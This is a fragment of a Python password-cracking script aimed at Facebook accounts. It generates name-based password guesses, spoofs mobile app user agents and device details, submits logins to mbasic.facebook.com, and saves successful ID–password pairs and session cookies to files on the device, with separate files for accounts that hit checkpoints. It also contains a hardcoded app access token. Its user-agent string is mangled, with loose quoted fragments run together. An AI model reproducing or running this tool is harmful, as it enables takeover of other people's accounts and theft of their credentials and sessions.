                                open('/sdcard/ALEX-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                open('/sdcard/Alex-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+kuki+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in VEER:
                                if 'y' in pcp:
                                        print('\r\r\x1b[1;93m [CHECKPOINT] '+ids+' | '+pas+' | ['+alex(ids)+']\033[1;97m')
                                        open('/sdcard/ALEX-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
                loop+=1
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        except Exception as e:
                pass
        			
##################################

##METHOD 1 mbasic.facebook.com
def ffb1(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [ALEX-CRACKING]  %s | ALIVE: %s | CHECKPOINT: %s\033[1;37m'%(loop,len(oks),len(cps)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(' ')[0]
                try:
                        last = names.split(' ')[1]
                except:
                        last = 'Khan'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
                        pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
                        android_version=str(random.randrange(6,13))
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        model = random.choice(['itel vesion 3 plus','Infinix X672','Infinix X6815B','Infinix X6815B','Infinix X6515','Infinix X6516','Infinix X6825','Infinix X5516B','Infinix X669C','Infinix X669D','Infinix X6815C','Infinix X670','Infinix X5516C','Infinix X6826B','Infinix X5516C','Infinix X676C','Infinix X697','Infinix X5516B','Infinix X6515','Infinix X6811'])
                        fbap = random.choice(['738.0.0.11.397','60.0.0.16.76','419.0.0.20.71','504.0.0.28482','354.0.0.8.108','405.0.0.16.112','414.0.0.30.113','400.0.0.37.76','414.0.0.30.113','408.1.0.16.113'])
                        
###################################                      
                        ua = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,318)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/Orca-Android;FBAV/262.0.0.2.178;FBBV/405224545;FBDM/{density=3.3,width=1080,height=1464};FBLC/en_US;FBRV/325.0.0.2.157;FBCR/TM;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.orca;FBDV/XT2127-112;FBSV/9;FBOP/1;FBCA/arm64-v8a:]','[FBAN/FB4A;FBAV/210.0.0.2.179;FBBV/219589580;FBDM/{density=2.4,width=1080,height=1441};FBLC/en_US;FBRV/306.0.0.3.151;FBCR/Telenor Serbia;FBMF/nokia;FBBD/nokia;FBPN/com.facebook.katana;FBDV/TA-1297;FBSV/10;FBOP/1;FBCA/arm64-v8a:]'Mozilla/5.0 (Linux; Android11; MI 8 Lite Build/PKQ1.181007.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/84.0.4533.146 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/342.0.0.24.172;]','[FBAN/FB4A;FBAV/276.0.0.5.120;FBPN/com.facebook.katana;FBLC/en_PH;FBBV/872029131;FBCR/Vodafone Germany;FBMF/huawei;FBBD/huawei;FBDV/Huawei_Mate_20;FBSV/12;FBCA/arm64-v8a:null;FBDM/{density=3.3,width=720,height=1409};FB_FW/1;]'[FBAN/FB4A;FBAV/266.0.0.1.138;FBBV/171634193;FBDM/{density=2.1,width=1080,height=1407};FBLC/en_US;FBRV/254.0.0.8.173;FBCR/Movistar Mexico;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ZenFone Zoom;FBSV/11;FBOP/1;FBCA/arm64-v8a:]','[FBAN/FB4A;FBAV/330.0.0.8.175;FBPN/com.facebook.katana;FBLC/en_PH;FBBV/241297365;FBCR/A1 Telekom Austria;FBMF/oneplus;FBBD/oneplus;FBDV/OnePlus_8_Pro;FBSV/12;FBCA/arm64-v8a:null;FBDM/{density=3.4,width=720,height=1475};FB_FW/1;]'Mozilla/5.0 (Linux; Android10; M2101K9AG Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4846.186 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/212.0.0.38.166;]','Dalvik/2.1.0 (Linux; U; Android 11; Studio Mini 2023 Build/SP1A.210812.016) [FBAN/Orca-Android;FBAV/313.0.0.9.106;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/357764214;FBCR/M1 Singapore;FBMF/motorola;FBBD/motorola;FBDV/Motorola Moto G Play (2021);FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=2.5,width=720,height=1475};FB_FW/1;]'[FBAN/FB4A;FBAV/364.0.0.6.194;FBBV/994218238;FBDM/{density=2.3,width=1080,height=1433};FBLC/en_US;FBRV/291.0.0.2.134;FBCR/Cosmote Greece;FBMF/oneplus;FBBD/oneplus;FBPN/com.facebook.katana;FBDV/OnePlus_6T;FBSV/9;FBOP/1;FBCA/arm64-v8a:]','[FBAN/Orca-Android;FBAV/357.0.0.9.136;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/974443829;FBCR/Singtel;FBMF/huawei;FBBD/huawei;FBDV/Huawei_P20;FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=3.3,width=720,height=1442};FB_FW/1;]'"

###################################               
                        head = {'Host': 'mbasic.facebook.com', 'viewport-width': '824', 'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="120"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-GB,en;q=0.9,si-LK;q=0.8,si;q=0.7,en-US;q=0.6'}
                        getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        VEER=session.cookies.get_dict().keys()
                        if "c_user" in VEER:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print(f'\r\r\x1b[1;92m [ALEX-ALIVE] %s | %s | %s | %s'%(ids,pas,alex(ids),kuki))
                                open('/sdcard/ALEX-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                open('/sdcard/Alex-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+kuki+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in VEER:
                                if 'y' in pcp:
                                        print('\r\r\x1b[1;93m [CHECKPOINT] '+ids+' | '+pas+' | ['+alex(ids)+']\033[1;97m')
                                        open('/sdcard/ALEX-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
                loop+=1
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        except Exception as e:
                pass

####END
menu()                                
